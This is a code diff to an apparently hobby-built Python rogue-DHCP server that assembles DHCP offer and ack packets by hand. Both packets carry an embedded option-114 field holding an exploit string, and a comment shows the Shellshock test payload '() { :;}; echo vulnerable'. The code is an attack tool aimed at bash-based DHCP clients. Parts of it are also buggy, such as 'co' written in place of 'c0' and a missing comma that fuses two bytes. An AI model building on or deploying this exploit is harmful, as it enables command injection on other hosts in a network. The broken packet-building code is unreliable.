@@ -1,8 +1,14 @@
 import socket
 import select
 from binascii import hexlify
+import collections
 
-
+def flatten_list(ze_list):
+    for sublist in ze_list:
+        if isinstance(sublist, collections.Iterable) and not isinstance(sublist, (str, bytes)):
+            yield from flatten_list(sublist)
+        else:
+            yield sublist
 
 class Listener:
     def __init__(self):
@@ -48,8 +54,7 @@ class Listener:
                     self.dhcp_socket.send(return_offer)
 
                 elif 'client' in 'requesting_client_list':
-                    return_frame = self.craft_frame(ethernet_header, ip_header, udp_header, dhcpPacket.ack)
-                    self.send_frame(return_frame)
+                    return_ack = dhcpPacket.craft_ack()
                 else:
                     pass
 
@@ -121,7 +126,6 @@ class Listener:
             self.offer = None
             self.ack = None
 
-
         def craft_offer(self):
             op = [b'02']  # REquest=ff or reply=00
             htype = [b'01']  # Hardware address type 01=ethernet
@@ -132,34 +136,42 @@ class Listener:
             flags = self.flags  # leftmost bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
             ciaddr = self.ciaddr  # client ip address
             yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
+            self.yiaddr = yiaddr
             siaddr = dhcpServer.server_ip  # Server ip address
+            self.siaddr = siaddr
             giaddr = self.giaddr  # first relay agent ip address
             chaddr = self.chaddr  # client hardware address
             sname = self.sname  # server host name
             file = self.file  # bootfile name, routing information defined by server to the client
-
-
-
-            # options = frame[237:]  # additional parameters
-
-            options = [b'53', b'01', b'02'  # DHCP, len, Offer
-                       b'01', b'04', b'ff', b'ff', b'ff', b'00',  # subnetmask flag on, len=4, subnetmask
-                       ## NEED A RENEWL TIME VALUE FLAG HERE
-                       ## NEED A REBINDING TIME VALUE FLAG HERE
+            options = [b'35', b'01', b'05',  # DHCP, len, Offer
+                       b'01', b'04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
+                       b'3a', b'04', b'00', b'00' b'07', b'08',  # Renewel time
+                       b'3b', b'04', b'00', b'00', b'07', b'08',  # rebind time value
                        b'33', b'04', b'00', b'00', b'0e', b'10',  # lease time
-                       b'36', b'04', b'c0', b'a8',
-                       b'00', b'01',  # DHCP server identifier
-                       # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
-                       b'72', self.exploit_len, self.exploit,
-                       # NEED DHCP SERVER FLAG HERE
+                       b'36', b'04', b'c0', b'a8', b'6e', b'17', # DHCP server identifier (ip address)
+                       b'72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                        b'ff',  # end flag
-                       # NEED PADDING HERE FOR UNUSED FLAGS
+                       # padding to end at word boundry for the options
                        ]
 
-            options_padding = [[b'00']*7,[b'0a']]
-            options = [item for sublist in options for item in sublist]
-            options_padding = [item for sublist in options_padding for item in sublist]
-            return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname, file, options, options_padding]
+            options = list(flatten_list(options))
+
+            options_padding_check = len(options)
+            options_padding_length = 0
+            while (options_padding_check/4) != int(options_padding_check/4):
+                options_padding_check += 1
+                options_padding_length += 1
+
+            print(options_padding_length/4)
+            if options_padding_length > 1:
+                options_padding = [[b'00']*(options_padding_length-1),[b'0a']]
+                options_padding = list(flatten_list(options_padding))
+
+                return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname, file, options, options_padding]
+
+            else:
+                return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
+                                 file, options]
             print(return_packet)
 
 
@@ -170,36 +182,55 @@ class Listener:
         def craft_ack(self):
 
             # binary
-            self.op = [b'02']  # REquest or reply
-            self.htype = [b'01']  # Hardware address type
-            self.hlen = [b'06']  # Hardware length
-            self.hops = [self.hops]  # hops; number of relay agents the message travels through, each one will add one
-            self.xid = [
-                self.xid]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
-            self.secs = [b'00', b'00']  # number of seconds elapsed since clent sent a dhcp request
-            self.flags = [b'00',
-                          b'00']  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
-            self.ciaddr = [b'00', b'00', b'00', b'00']  # client ip address
-            self.yiaddr = [self.yiaddr]  # 'your' ip address, as assigned by server
-            self.siaddr = [self.siaddr]  # Server ip address
-            self.giaddr = [b'00', b'00', b'00', b'00']  # first relay agent ip address
-            self.chaddr = [self.chaddr]  # client hhardware address
-            self.sname = [self.sname]  # server host name
-            self.file = [self.file]  # bootfile name, routing information defined by server to the client
-            options = [b'53', b'01', b'02'  # DHCP, len, Offer
-                        b'01', b'04', b'ff', b'ff', b'ff', b'00'  # subnetmask flag on, len=4, subnetmask
-                        ## NEED A RENEWL TIME VALUE FLAG HERE
-                        ## NEED A REBINDING TIME VALUE FLAG HERE
-                        b'33', b'04', b'00', b'00', b'0e', b'10'  # lease time
-                        b'36', b'04', b'c0', b'a8',
-                        b'00',
-                        b'01'  # DHCP server identifier
-                        # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
-                        b'72', self.exploit_len, self.exploit,
-                        # NEED DHCP SERVER FLAG HERE
-                        b'ff'  # end flag
-                        # NEED PADDING HERE FOR UNUSED FLAGS
+            op = [b'02']  # REquest or reply
+            htype = [b'01']  # Hardware address type
+            hlen = [b'06']  # Hardware length
+            hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
+            xid = self.xid  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
+            secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
+            flags = self.flags # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
+            ciaddr = self.ciaddr  # client ip address
+            yiaddr = self.yiaddr  # 'your' ip address, as assigned by server
+            siaddr = self.siaddr  # Server ip address
+            giaddr = self.giaddr  # first relay agent ip address
+            chaddr = self.chaddr  # client hhardware address
+            sname = self.sname  # server host name
+            file = self.file  # bootfile name, routing information defined by server to the client
+            options = [ b'35', b'01', b'05',  # DHCP, len, Offer
+                        b'01', b'04', b'ff', b'ff', b'ff', b'00',  # subnetmask flag on, len=4, subnetmask
+                        b'3a', b'04', b'00', b'00' b'07', b'08', # Renewel time
+                        b'3b', b'04', b'00', b'00', b'07', b'08', #rebind time value ////CHECK T?HIS
+                        b'33', b'04', b'00', b'00', b'0e', b'10',  # lease time
+                        b'36', b'04', b'c0', b'a8', b'6e', b'17',#DHCP ID (server ip)
+                        b'72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
+                        b'ff',  # end flag
+                        # padding for word boundries
                         ]
+
+            options = list(flatten_list(options))
+
+            options_padding_check = len(options)
+            options_padding_length = 0
+            while (options_padding_check / 4) != int(options_padding_check / 4):
+                options_padding_check += 1
+                options_padding_length += 1
+
+            print(options_padding_length / 4)
+            if options_padding_length > 1:
+                options_padding = [[b'00'] * (options_padding_length - 1), [b'0a']]
+                options_padding = list(flatten_list(options_padding))
+
+                return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
+                                 file, options, options_padding]
+
+            else:
+                return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
+                                 file, options]
+            print(return_packet)
+
+            return_packet = [item for sublist in return_packet for item in sublist]
+            print(return_packet)
+            return (return_packet)
 
         def breakup_options(self, option_string):
             print('[+] breaking up options')
@@ -252,11 +283,11 @@ class Client:
 
 class DhcpServer:
     def __init__(self):
-        self.server_ip = ['co','a8', '6e', '17']
-        self.server_name = ['6c', '61', '70','70', '79']
+        self.server_ip = (b'co', b'a8', b'6e', b'17')
+        self.server_name = (b'6c', b'61', b'70', b'70', b'79')
 
-        self.client_ip_available = [('c0', 'a8', '00', '01'),('c0', 'a8', '00', '02')]
-        self.client_subnet = ['ff', 'ff', 'ff', '00']
+        self.client_ip_available = [(b'c0', b'a8', b'00', b'01'), (b'c0', b'a8', b'00', b'02')]
+        self.client_subnet = (b'ff', b'ff', b'ff', b'00')
 
     def get_next_ip(self):
         ip = self.client_ip_available.pop()
